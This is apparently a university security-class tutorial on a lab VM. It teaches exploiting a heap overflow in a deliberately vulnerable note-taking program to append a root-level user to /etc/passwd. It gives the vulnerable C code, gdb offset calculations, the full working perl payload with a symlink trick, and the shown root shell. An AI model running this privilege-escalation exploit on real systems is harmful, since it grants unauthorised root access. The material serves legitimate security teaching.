Tutorial:  Heap overflow exploit - Abusing the file system
===========================================================

Introduction
------------

Download the Kali VM from this link (Same than NFS - Metasploitable)

.. centered:: https://transvol.sgsi.ucl.ac.be/download.php?id=cdb293424a0498c7

| Working directory: ``~/SecurityClass/Tutorial-Extra``
| Connection:

============ ============
**username** **password**
============ ============
admin        nimda
============ ============

.. warning:: **Before you start this exercise I STRONGLY suggest that you backup
             any important file on your VM ‼️**

.. code:: console

   $ cp /etc/passwd /tmp/passwd.bkup


In this exercise, we will see how we can exploit the heap to create a
new user with root access.

The program we will be exploiting is a simple note taker that will write
the user input into a file located at ``/var/notes``. This simple piece
of code is poorly written and is vulnerable to a heap-based overflow.

We can try this program with some simple input like :

.. code:: console

   $ ./note_taker "Some boring text"
   [DEBUG] buffer @ 0x804d1a0: 'Some boring text'
   [DEBUG] datafile @ 0x804d210: '/var/notes'
   Note has been saved.
   $ sudo cat /var/notes

   Some boring text
   $

.. raw:: html

   <div class="collapse tp1_s0" id="tp1_0_1">
          <div class="panel panel-primary">
        <div class="panel-body">


We can try this program with some simple input like :

.. code:: console

   $ ./note_taker "Some boring text"
   [DEBUG] buffer @ 0x804d1a0: 'Some boring text'
   [DEBUG] datafile @ 0x804d210: '/var/notes'
   Note has been saved. 
   $ sudo cat /var/notes

   Some boring text
   $

However if we try with a longer input, let's say of size 120, we get the
following output :

.. code:: console

   $ ./note_taker $(perl -e 'print "A"x120')
   [DEBUG] buffer @ 0x804d1a0: 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
   [DEBUG] datafile @ 0x804d210: 'AAAAAAAA'
   Note has been saved. 
   double free or corruption (out)
   Aborted
   $ ls
   AAAAAAAA  note_taker  note_taker.c  README.md
   $ sudo cat AAAAAAAA 

   AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
   $

| We can see that the datafile variable has been overwritten and that the program has effectively created the note in the current folder under the file `AAAAAAAA`.
| Let's now see how we can exploit this.

.. raw:: html

   </div>
   </div>
   </div>

Exercise
--------

Finding vulnerable code
~~~~~~~~~~~~~~~~~~~~~~~
❓ **Can you spot which line of code is vulnerable to a heap-based overflow
?**

.. hint::  **💡 Don't forget how the memory is based and the difference
          between the stack and the heap.**


.. raw:: html

   <div class="collapse tp1_s0" id="tp1_0_2">
          <div class="panel panel-primary">
        <div class="panel-body">

We have seen that we created a new file but how useful is that? There
are a few files that are useful to gain more privileges. For examples
let's say we grant privileges to users via the ``/etc/sudoers`` file or
even that we add a new user with root privileges to the ``/etc/passwd``
file. In this case we will do the later one.

We can see that the vulnerability happens on the line **strcpy(buffer,
argv[1]);**. Without checking the length of the argument, we can
overflow the first buffer and write on the second buffer *datafile*.

.. code:: C

   int main(int argc, char* argv[]){
     int userid, fd; // File descriptor
     char * buffer, *datafile;
     
     buffer = (char *) malloc(100);
     if (buffer == NULL)
       return -1;

     datafile = (char *) malloc(20);
     if (datafile == NULL)
       return -1;
     strcpy(datafile, "/var/notes");
     
     if (argc < 2){
       printf("Usage : ./note-taker \'Some very interesting message\'\n");
       return-1;
     }
     strcpy(buffer, argv[1]);

.. raw:: html

   </div>
   </div>
   </div>

Locate the heap in memory
~~~~~~~~~~~~~~~~~~~~~~~~~

It is often usefull to take a look at the heap's memory to debug. In
this case we want to see where in memory the *datafile* and *buffer*
variables are located. (We assume that we don't print any DEBUG
information)

❓ **Using** ``gdb``  **can you find a way to locate the address of the heap?**

.. hint:: **💡 You can put a breakpoint somewhere in the program and see the
          state of the registers as well as other usefull information regarding
          the stack and the heap. Once you find the heap you can take a look at
          its content easily.**

.. raw:: html

   <div class="collapse tp1_s0" id="tp1_0_3">
          <div class="panel panel-primary">
        <div class="panel-body">

We can use gdb to locate the heap and the two buffers. First we need to
find a place to put a breakpoint. Line 26 is a perfect place

.. code:: console

   $ gdb -q note_taker
   (gdb) list main,26
   8   int main(int argc, char* argv[]){
   9     int userid, fd; // File descriptor
   10    char * buffer, *datafile;
   11    
   12    buffer = (char *) malloc(100);
   13    if (buffer == NULL)
   14      return -1;
   15  
   16    datafile = (char *) malloc(20);
   17    if (datafile == NULL)
   18      return -1;
   19    strcpy(datafile, "/var/notes");
   20    
   21    if (argc < 2){
   22      printf("Usage : ./note-taker \'Some very interesting message\'\n");
   23      return-1;
   24    }
   25    strcpy(buffer, argv[1]);
   26
   (gdb) b 26
   Breakpoint 1 at 0x8049294: file note_taker.c, line 27.
   $

We can now run the program with a recognizable input like *AAAA* and
examine memory.

.. code:: console

   (gdb) run AAAA
   [...]
   (gdb) info proc map
   process 7668
   Mapped address spaces:

       Start Addr   End Addr       Size     Offset objfile
        0x8048000  0x804b000     0x3000        0x0 /home/kali/Documents/Security/LINGI2144-2020-2022/heap-exploit/file_writer/note_taker
        0x804b000  0x804c000     0x1000     0x2000 /home/kali/Documents/Security/LINGI2144-2020-2022/heap-exploit/file_writer/note_taker
        0x804c000  0x804d000     0x1000     0x3000 /home/kali/Documents/Security/LINGI2144-2020-2022/heap-exploit/file_writer/note_taker
        0x804d000  0x806f000    0x22000        0x0 [heap]
       0xb7dd7000 0xb7fb5000   0x1de000        0x0 /usr/lib/i386-linux-gnu/libc-2.30.so
       0xb7fb5000 0xb7fb7000     0x2000   0x1dd000 /usr/lib/i386-linux-gnu/libc-2.30.so
       0xb7fb7000 0xb7fb9000     0x2000   0x1df000 /usr/lib/i386-linux-gnu/libc-2.30.so
       0xb7fb9000 0xb7fbb000     0x2000        0x0 
       0xb7fd0000 0xb7fd2000     0x2000        0x0 
       0xb7fd2000 0xb7fd5000     0x3000        0x0 [vvar]
       0xb7fd5000 0xb7fd6000     0x1000        0x0 [vdso]
       0xb7fd6000 0xb7ffe000    0x28000        0x0 /usr/lib/i386-linux-gnu/ld-2.30.so
       0xb7ffe000 0xb7fff000     0x1000    0x27000 /usr/lib/i386-linux-gnu/ld-2.30.so
       0xb7fff000 0xb8000000     0x1000    0x28000 /usr/lib/i386-linux-gnu/ld-2.30.so
       0xbffdf000 0xc0000000    0x21000        0x0 [stack]

We find that the heap is located at the address **0x804d000**. We can
then take a look at its memory.

.. code:: console

   (gdb) x/120x 0x804d000
   [...]
   0x804d190:  0x00000000  0x00000000  0x00000000  0x00000071
   0x804d1a0:  0x41414141  0x00000000  0x00000000  0x00000000
   0x804d1b0:  0x00000000  0x00000000  0x00000000  0x00000000

.. raw:: html

   </div>
   </div>
   </div>


Locate the two buffers
~~~~~~~~~~~~~~~~~~~~~~

**Using** ``gdb`` **can you locate the address of the two buffers?**

.. hint:: **💡 You may want to use some distinguishable input
          ("AAAABBBBCCCC", "ABCDEFGH", ...) that you can spot easily while looking
          at the memory.**

Once you have found the two buffers in memory you can calculate the
length needed to overflow the buffer into the datafile.

❓ **Using** ``gdb``  **find the number of bytes needed to overflow the second
buffer.**

.. warning:: **When using** ``gdb`` **to compute values using addresses, it
             might sometime display the result in hexadecimal value.**

.. code:: console

   (gdb) p 0xdeadbeef - 0xdeadbeaf
   $1 = 0x40
   (gdb) p/d 0xdeadbeef - 0xdeadbeaf
   $2 = 64

.. raw:: html

   <div class="collapse tp1_s0" id="tp1_0_4">
          <div class="panel panel-primary">
        <div class="panel-body">

We have found that our buffer variable is located at address
**0x804d1a0** and if we continue a bit further we find the datafile
variable located at address **0x804d210**.

.. code:: console

   (gdb)
   0x804d200:  0x00000000  0x00000000  0x00000000  0x00000021
   0x804d210:  0x7261762f  0x746f6e2f  0x00007365  0x00000000
   0x804d220:  0x00000000  0x00000000  0x00000000  0x00021dd9

We can then calculate the offset between the two locations :

.. code:: console

   (gdb) p/d 0x804d210 - 0x804d1a0
   $1 = 112

.. raw:: html

   </div>
   </div>
   </div>


Predicting the file name
~~~~~~~~~~~~~~~~~~~~~~~~

Now that you now how much bytes you need for the padding you should be
able to write to a file of your choice.

❓ **Try writing to the file** ``/var/test``.

.. hint:: **💡 You can use perl or python to generate long strings.**

You can look at the result using ``sudo cat /var/test``

❓ **Now try to fit a non-rubish sentence in this file.**

.. hint:: **💡 *You might need to change the padding depending on your sentence length.**

.. raw:: html

   <div class="collapse tp1_s0" id="tp1_0_5">
          <div class="panel panel-primary">
        <div class="panel-body">

Since in the last try we printed 120 characters and the last 8 bytes
were overflowing the datafile variable, we can assume that we need to
fill 112 bytes before our file name.

.. code:: console

   $ ./note_taker $(perl -e 'print "A"x112 . "/var/test"')
   [DEBUG] buffer @ 0x804d1a0: 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/var/test'
   [DEBUG] datafile @ 0x804d210: '/var/test'
   Note has been saved. 
   double free or corruption (out)
   Aborted
   $

As expected the correct filename is displayed.

.. raw:: html

   </div>
   </div>
   </div>

.. raw:: html

   <?php
         if($good) {
            //nothing
         } else {
            echo '<script type="text/javascript">',
                     'updateSol("tp1_0_0 tp1_0_1 tp1_0_2 tp1_0_3 tp1_0_4 tp1_0_5",".tp1_s0","predicting-the-file-name");',
                  '</script>';
            include "../_static/solution.html";
         }
   ?>

Gaining root access
-------------------

In this section we will see how to gain root privileges by creating a
new user in the ``/etc/passwd`` file.

.. warning:: **To prevent you from breaking your VM we will first try
             the exploit on the file** ``/var/passwd`` **first.**

.. code:: console

   $ cp /etc/passwd /tmp/passwd.bkup
   $


Create a new user
~~~~~~~~~~~~~~~~~

Let's examine what the ``/etc/passwd`` file looks like :

.. code:: console

   $ head /etc/passwd
   root:x:0:0:root:/root:/bin/bash
   daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
   bin:x:2:2:bin:/bin:/usr/sbin/nologin
   sys:x:3:3:sys:/dev:/usr/sbin/nologin
   sync:x:4:65534:sync:/bin:/bin/sync
   games:x:5:60:games:/usr/games:/usr/sbin/nologin
   man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
   lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
   mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
   news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
   $

The format is described here `/etc/passwd file format<https://www.ibm.com/support/knowledgecenter/en/ssw_aix_71/security/passwords_etc_passwd_file.html>`_

The important informations here are the user ID number (UID) and the
login shell. Any entry in this file that has a user ID of 0 has root
privileges so that's what we are aiming for. We can also define our own
password but first we need to encrypt it.


❓ **Find by yourself what is the format of this file. What information do
you think can be usefull to gain root privileges?**

❓ **Write down (on paper or anywhere else) what you would need to write to
create a new user with root privileges that spawn a shell upon login.**

.. hint:: **💡 The** ``x`` **field means that the password are stored in the**
          ``/etc/shadow`` **file. We can however put an encrypted password. With
          perl you can generate a encrypted password with the following command.**

.. code:: console

   $ perl -e 'print crypt("password", "AA") . "\n"' # "AA" is the salt value, don't worry about it too much
   AA6tQYSfGxd/A
   $

Your string should look like something like this :

::

   hackerman:AA6tQYSfGxd/A:0:0:me:/root:/bin/bash"

❓ **At this point the string does not end with the correct sequence has it
would write to** ``/bin/bash`` **instead of** ``/etc/passwd``. We can however
use a clever bypass by using symbolic file link. We can create any file
ending with ``/etc/passwd`` (eg: ``/var/etc/passwd``,
``/tmp/etc/passwd``) and link it to ``/bin/bash``.

.. code:: console

   $ mkdir /tmp/var
   $ ln -s /bin/bash /tmp/var/passwd
   $ ls -l /tmp/var/passwd
   lrwxrwxrwx 1 kali kali 9 Jul 21 11:29 /tmp/var/passwd -> /bin/bash
   $

.. note:: **When testing your exploit on** ``/etc/passwd`` **you just need to
          replace every occurrences of** ``/var/passwd`` **by** ``/etc/passwd``.

.. code:: console

   $ mkdir /tmp/etc
   $ ln -s /bin/bash /tmp/etc/passwd
   $ ls -l /tmp/etc/passwd
   lrwxrwxrwx 1 kali kali 9 Jul 21 11:29 /tmp/etc/passwd -> /bin/bash
   $

Our string now looks like this :

::

   hackerman:AA6tQYSfGxd/A:0:0:me:/root:/tmp/etc/passwd"

We just need to add some padding bytes so that the string from the
beginning till */tmp* has the length you computed previously.

❓ **What field do you think we can use as padding ?**

.. hint:: **💡 You can use perl or python to generate a string and check
          what length it has by using the following piped command**

.. code:: console

   $ perl -e 'print "something"' | wc -c
   9
   $

Once you think you padded your string correctly you can try the exploit
on the ``/var/passwd`` file.

❓ **Can you append the correct user entry to the** ``/var/passwd`` **file?**

If everything works fine you can try it on the ``/etc/passwd`` file.
(Remember to create the correct symbolic link as explained previously)

.. note:: **The program will most likely exit in a dirty fashion like**
          ``Aborted`` **. Don't worry about it too much.**

❓ **Can you log in your new user account ? What privileges do you have ?**

.. raw:: html

   <div class="collapse tp1_s2" id="tp1_2_1">
          <div class="panel panel-primary">
        <div class="panel-body">


We can now fill the *full user name (GECOS)* field for padding so we can
adjust our buffer correctly.

.. code:: console

   $ perl -e 'print "hackerman:AA6tQYSfGxd/A:0:0:me:/root:/tmp"' | wc -c
   41
   $ perl -e 'print "hackerman:AA6tQYSfGxd/A:0:0:" . "A"x50 . ":/root:/tmp"' | wc -c
   89
   $ gdb -q
   (gdb) p/d 112 - 89 + 50
   $1 = 73
   (gdb) quit
   $ perl -e 'print "hackerman:AA6tQYSfGxd/A:0:0:"."A"x73 .":/root:/tmp"' | wc -c
   112

We have successfully padded the buffer so now we just need to add the
file at the end of the string and it shoudl work perfectly.

.. code:: console

   ./note_taker $(perl -e 'print "hackerman:AA6tQYSfGxd/A:0:0:"."A"x73 .":/root:/tmp/etc/passwd"')
   [DEBUG] buffer @ 0x804d1a0: 'hackerman:AA6tQYSfGxd/A:0:0:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA:/root:/tmp/etc/passwd'
   [DEBUG] datafile @ 0x804d210: '/etc/passwd'
   Note has been saved. 
   munmap_chunk(): invalid pointer
   Aborted
   $ tail /etc/passwd

   hackerman:AA6tQYSfGxd/A:0:0:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA:/root:/tmp/etc/passwd
   $ su hackerman
   Password : #password
   root@kali:/home/kali# whoami
   root
   root@kali:/home/kali#

And just like so we got a brand new root access !

.. raw:: html

   </div>
   </div>
   </div>

.. raw:: html

   <?php
         if($good) {
            //nothing
         } else {
            echo '<script type="text/javascript">',
                     'updateSol("tp1_2_1",".tp1_s2","create-a-new-user");',
                  '</script>';
            include "../_static/solution.html";
         }
   ?>


BONUS
-----

One thing that could go wrong is that the buffer holding the datafile
variable (in this case ``/var/notes``) is not long enough to fit an
interesting file name.

❓ **Can you think of how to bypass this issue?**

.. hint:: **💡 You might need the natural logarithm...**

.. raw:: html

   <div class="collapse tp1_s1" id="tp1_1_0">
          <div class="panel panel-primary">
        <div class="panel-body">

If the buffer for the datafile is not large enough, we may not be able
to fit the full ``/etc/passwd`` string length. However we can use the
same trick as for spawning a bash : symbolic file link.

.. code:: console

   $ ln -s /etc/passwd passwd

We now have to change the padding so that only the last part of the file
(``passwd``) overflow the datafile buffer.

.. code:: console

   ./note_taker $(perl -e 'print "hackermon:AA6tQYSfGxd/A:0:0:"."A"x68 .":/root:/tmp/etc/passwd"')
   [DEBUG] buffer @ 0x804d1a0: 'hackermon:AA6tQYSfGxd/A:0:0:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA:/root:/tmp/etc/passwd'
   [DEBUG] datafile @ 0x804d210: 'passwd'
   Note has been saved. 
   Segmentation fault

The datafile correctly outputs ``passwd`` and if we try to change user :

.. code:: console

   su hackermon
   Password : #password
   root@kali:/home/kali# whoami
   root
   root@kali:/home/kali#

.. raw:: html

   </div>
   </div>
   </div>

.. raw:: html

   <?php
         if($good) {
            //nothing
         } else {
            echo '<script type="text/javascript">',
                     'updateSol("tp1_1_0",".tp1_s1","bonus");',
                  '</script>';
            include "../_static/solution.html";
         }
   ?>